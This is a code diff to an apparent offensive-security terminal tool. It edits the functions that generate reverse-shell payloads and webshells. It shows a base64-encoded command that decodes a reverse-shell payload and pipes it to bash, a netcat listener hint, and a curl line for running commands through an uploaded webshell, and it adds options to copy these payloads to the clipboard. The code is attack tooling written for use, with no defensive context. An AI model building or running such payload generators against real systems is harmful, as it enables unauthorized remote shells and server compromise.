@@ -7,7 +7,7 @@ import subprocess
 
 from ui.helpers import (
     console, pause, ask, ask_int, show_error, show_success, show_info,
-    menu_header, render_menu, choose, get_project_or_warn,
+    menu_header, render_menu, choose, get_project_or_warn, copy_to_clipboard
 )
 from core.project import save_project, get_project_output_dir
 from core.config import (
@@ -125,12 +125,20 @@ def action_reverse_shell():
 
     # Base64 encoded version
     b64 = base64.b64encode(payload.encode()).decode()
+    b64_cmd = f"echo {b64} | base64 -d | bash"
     console.print(Panel(
-        f"[bold cyan]echo {b64} | base64 -d | bash[/]",
+        f"[bold cyan]{b64_cmd}[/]",
         title="[bold]Base64 Encoded[/]", border_style="cyan",
     ))
 
     console.print(f"\n  [dim]💡 Start listener: [bold]nc -lvnp {lport}[/][/]")
+
+    if confirm("Copy payload to clipboard?"):
+        c = choose([("1", "📄", "Raw Payload"), ("2", "📄", "Base64 Command")], back_label="Skip")
+        if c == "1":
+            copy_to_clipboard(payload, "Raw payload")
+        elif c == "2":
+            copy_to_clipboard(b64_cmd, "Base64 command")
 
     logger = ActivityLogger(data)
     logger.log_payload(shell_type, details=f"Generated {shell_type} → {lhost}:{lport}")
@@ -243,6 +251,9 @@ def action_webshell():
     show_success(f"Webshell generated: [cyan]{outpath}[/]")
     console.print(Panel(content, title=f"[bold]{shell_type}[/]", border_style="yellow"))
     console.print(f"\n  [dim]💡 Usage: curl 'http://target/{outfile}?cmd=id'[/]")
+    
+    if confirm("Copy webshell to clipboard?"):
+        copy_to_clipboard(content, "Webshell content")
 
     logger = ActivityLogger(data)
     logger.log_payload("webshell", details=f"Generated {shell_type}", output_file=str(outpath))
